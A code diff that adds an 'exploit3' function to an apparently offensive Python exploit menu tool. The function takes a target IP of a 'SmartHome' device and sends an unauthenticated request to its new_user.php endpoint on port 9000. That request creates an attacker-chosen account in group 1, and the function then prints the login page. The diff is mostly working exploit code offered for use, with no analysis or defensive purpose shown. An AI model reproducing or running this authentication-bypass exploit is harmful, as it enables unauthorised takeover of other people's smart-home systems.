@@ -341,11 +341,71 @@ Writen in python by Kuburan
             finish_exploit()
             BACK.menu['menu_utama']()
 
-
     elif choise == '0':
         BACK.menu['menu_utama']()
 
-
     else:
         print warna.merah + "\n[x] " + warna.tutup + "Wrong command."
+        BACK.menu['menu_utama']()
+
+def exploit3():
+    try:
+        IP()
+        print(warna.kuning + "\n[!]" + warna.tutup + " the Vulnerability allow unauthenticated attacker to remotely bypass authentication and added new user.")
+        print(warna.kuning + "[!]" + warna.tutup + " Affected version : 4.20 and older")
+        target = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address of SmartHome device" + warna.kuning + "  >>  " + warna.tutup)
+        true_ip = ipv4(target)
+        if target == '':
+            empty()
+            BACK.menu['menu_utama']()
+
+        if not true_ip:
+            print(warna.merah + "\n[x] " + warna.tutup + "Wrong ip adress")
+            BACK.menu['menu_utama']()
+
+        port = '9000'
+        print(warna.kuning + "\n[!]" + warna.tutup + " Make your own username")
+        user = raw_input(warna.biru + "[+]" + warna.tutup + " Username" + warna.kuning + "  >>  " + warna.tutup)
+        if user == '':
+            empty()
+            BACK.menu['menu_utama']()
+
+        print(warna.kuning + "\n[!]" + warna.tutup + " Make your own password")
+        password = raw_input(warna.biru + "[+]" + warna.tutup + " Password" + warna.kuning + "  >>  " + warna.tutup)
+        if password == '':
+            empty()
+            BACK.menu['menu_utama']()
+
+        url = ("http://%s:%s/content/new_user.php?user_name=%s&password=%s&group_id=1" %
+              (target, port, user, password))
+        req = requests.get(url, timeout=10)
+        req.status_code
+        req.raise_for_status()
+        if req.ok:
+            print(warna.hijau + "\n[*] " + warna.tutup + "Successfully added new users")
+            print("\n    username   : %s" % (user))
+            print("    password   : %s" % (password))
+            print("    login page : http://%s:%s/content/smarthome.php" % (target, port))
+            finish_exploit()
+            BACK.menu['menu_utama']()
+
+        else:
+            print(warna.merah + "\n[x] " + warna.tutup + "Failed to add new users, it looks like your target is not a SmartHome System")
+            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+    except requests.exceptions.HTTPError as error_1:
+        print warna.merah + "\n[x]" + warna.tutup + " Http Error : ", error_1
+        BACK.menu['menu_utama']()
+
+    except requests.exceptions.ConnectionError as error_2:
+        print warna.merah + "\n[x]" + warna.tutup + " Error Connecting : ", error_2
+        BACK.menu['menu_utama']()
+
+    except requests.exceptions.Timeout as error_3:
+        print warna.merah + "\n[x]" + warna.tutup + " Timeout Error : ", error_3
+        BACK.menu['menu_utama']()
+
+    except requests.exceptions.RequestException as err:
+        print warna.merah + "\n[x]" + warna.tutup, err
         BACK.menu['menu_utama']()
